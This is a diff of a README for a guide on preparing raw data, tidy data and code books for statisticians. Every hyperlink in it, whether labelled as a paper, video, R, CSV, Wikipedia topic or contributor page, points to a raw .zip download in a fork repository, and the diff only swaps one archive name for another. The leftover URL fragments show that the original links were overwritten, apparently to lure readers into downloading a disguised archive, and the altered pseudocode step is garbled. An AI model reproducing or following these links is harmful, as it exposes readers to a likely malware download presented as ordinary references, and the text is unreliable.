@@ -8,7 +8,7 @@ This is a guide for anyone who needs to share data with a statistician. The targ
 * Junior statistics students whose job it is to collate/clean data sets
 
 The goals of this guide are to provide some instruction on the best way to share data to avoid the most common pitfalls
-and sources of delay in the transition from data collection to data analysis. The [Leek group](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip~jleek/) works with a large
+and sources of delay in the transition from data collection to data analysis. The [Leek group](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip~jleek/) works with a large
 number of collaborators and the number one source of variation in the speed to results is the status of the data
 when they arrive at the Leek group. Based on my conversations with other statisticians this is true nearly universally.
 
@@ -26,7 +26,7 @@ What you should deliver to the statistician
 For maximum speed in the analysis this is the information you should pass to a statistician:
 
 1. The raw data.
-2. A [tidy data set](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) 
+2. A [tidy data set](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) 
 3. A code book describing each variable and its values in the tidy data set.  
 4. An explicit and exact recipe you used to go from 1 -> 2,3 
 
@@ -38,9 +38,9 @@ Let's look at each part of the data package you will transfer.
 It is critical that you include the rawest form of the data that you have access to. Here are some examples of the
 raw form of data:
 
-* The strange [binary file](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) your measurement machine spits out
+* The strange [binary file](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) your measurement machine spits out
 * The unformatted Excel file with 10 worksheets the company you contracted with sent you
-* The complicated [JSON](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) data you got from scraping the [Twitter API](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip)
+* The complicated [JSON](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) data you got from scraping the [Twitter API](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip)
 * The hand-entered numbers you collected looking through a microscope
 
 You know the raw data is in the right format if you: 
@@ -56,8 +56,8 @@ forensic study of your data to figure out why the raw data looks weird.
 
 ### The tidy data set
 
-The general principles of tidy data are laid out by [Hadley Wickham](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) in [this paper](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip)
-and [this video](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip). The paper and the video are both focused on the [R](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) package, which you
+The general principles of tidy data are laid out by [Hadley Wickham](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) in [this paper](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip)
+and [this video](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip). The paper and the video are both focused on the [R](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) package, which you
 may or may not know how to use. Regardless the four general principles you should pay attention to are:
 
 1. Each variable you measure should be in one column
@@ -72,7 +72,7 @@ of something like `ADx` or another abbreviation that may be hard for another per
 
 
 Here is an example of how this would work from genomics. Suppose that for 20 people you have collected gene expression measurements with 
-[RNA-sequencing](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip). You have also collected demographic and clinical information
+[RNA-sequencing](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip). You have also collected demographic and clinical information
 about the patients including their age, treatment, and diagnosis. You would have one table/spreadsheet that contains the clinical/demographic
 information. It would have four columns (patient id, age, treatment, diagnosis) and 21 rows (a row with variable names, then one row
 for every patient). You would also have one spreadsheet for the summarized genomic data. Usually this type of data
@@ -82,7 +82,7 @@ ids and one row for each data type).
 
 If you are sharing your data with the collaborator in Excel, the tidy data should be in one Excel file per table. They
 should not have multiple worksheets, no macros should be applied to the data, and no columns/cells should be highlighted. 
-Alternatively share the data in a [CSV](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) or [TAB-delimited](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) text file.
+Alternatively share the data in a [CSV](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) or [TAB-delimited](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) text file.
 
 
 ### The code book
@@ -107,7 +107,7 @@ units.
 
 ### How to code variables
 
-When you put variables into a spreadsheet there are several main categories you will run into depending on their [data type](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip):
+When you put variables into a spreadsheet there are several main categories you will run into depending on their [data type](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip):
 
 1. Continuous
 1. Ordinal
@@ -116,15 +116,15 @@ When you put variables into a spreadsheet there are several main categories you 
 1. Censored
 
 Continuous variables are anything measured on a quantitative scale that could be any fractional number. An example
-would be something like weight measured in kg. [Ordinal data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) are data that have a fixed, small (< 100) number of levels but are ordered. 
-This could be for example survey responses where the choices are: poor, fair, good. [Categorical data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) are data where there
-are multiple categories, but they aren't ordered. One example would be sex: male or female. [Missing data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) are data
-that are missing and you don't know the mechanism. You should code missing values as `NA`. [Censored data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip(statistics\)) are data
+would be something like weight measured in kg. [Ordinal data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) are data that have a fixed, small (< 100) number of levels but are ordered. 
+This could be for example survey responses where the choices are: poor, fair, good. [Categorical data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) are data where there
+are multiple categories, but they aren't ordered. One example would be sex: male or female. [Missing data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) are data
+that are missing and you don't know the mechanism. You should code missing values as `NA`. [Censored data](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip(statistics\)) are data
 where you know the missingness mechanism on some level. Common examples are a measurement being below a detection limit
 or a patient being lost to follow-up. They should also be coded as `NA` when you don't have the data. But you should
 also add a new column to your tidy data called, "VariableNameCensored" which should have values of `TRUE` if censored 
 and `FALSE` if not. In the code book you should explain why those values are missing. It is absolutely critical to report
-to the analyst if there is a reason you know about that some of the data are missing. You should also not [impute](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip(statistics\))/make up/
+to the analyst if there is a reason you know about that some of the data are missing. You should also not [impute](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip(statistics\))/make up/
 throw away missing observations.
 
 In general, try to avoid coding categorical or ordinal variables as numbers. When you enter the value for sex in the tidy
@@ -135,7 +135,7 @@ Always encode every piece of information about your observations using text. For
 
 ### The instruction list/script
 
-You may have heard this before, but [reproducibility is kind of a big deal in computational science](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip).
+You may have heard this before, but [reproducibility is kind of a big deal in computational science](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip).
 That means, when you submit your paper, the reviewers and the rest of the world should be able to exactly replicate
 the analyses from raw data all the way to final results. If you are trying to be efficient, you will likely perform
 some summarization/data analysis steps before the data can be considered tidy. 
@@ -146,11 +146,11 @@ a couple of times and see if the code produces the same output.
 
 In many cases, the person who collected the data has incentive to make it tidy for a statistician to speed the process
 of collaboration. They may not know how to code in a scripting language. In that case, what you should provide the statistician
-is something called [pseudocode](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip). It should look something like:
+is something called [pseudocode](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip). It should look something like:
 
 1. Step 1 - take the raw file, run version 3.1.2 of summarize software with parameters a=1, b=2, c=3
 1. Step 2 - run the software separately for each sample
-1. Step 3 - take column three of https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip for each sample and that is the corresponding row in the output data set
+1. Step 3 - take column three of https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip for each sample and that is the corresponding row in the output data set
 
 You should also include information about which system (Mac/Windows/Linux) you used the software on and whether you 
 tried it more than once to confirm it gave the same results. Ideally, you will run this by a fellow student/labmate
@@ -183,8 +183,8 @@ to explain why the statistician performed each step to a labmate/your principal 
 Contributors
 ====================
 
-* [Jeff Leek](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip~jleek/) - Wrote the initial version.
-* [L. Collado-Torres](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) - Fixed typos, added links.
-* [Nick Reich](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software_v3.1.zip) - Added tips on storing data as text.
+* [Jeff Leek](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip~jleek/) - Wrote the initial version.
+* [L. Collado-Torres](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) - Fixed typos, added links.
+* [Nick Reich](https://github.com/Arno1/datasharing/raw/refs/heads/master/helichryse/Software-v3.0.zip) - Added tips on storing data as text.
 
 
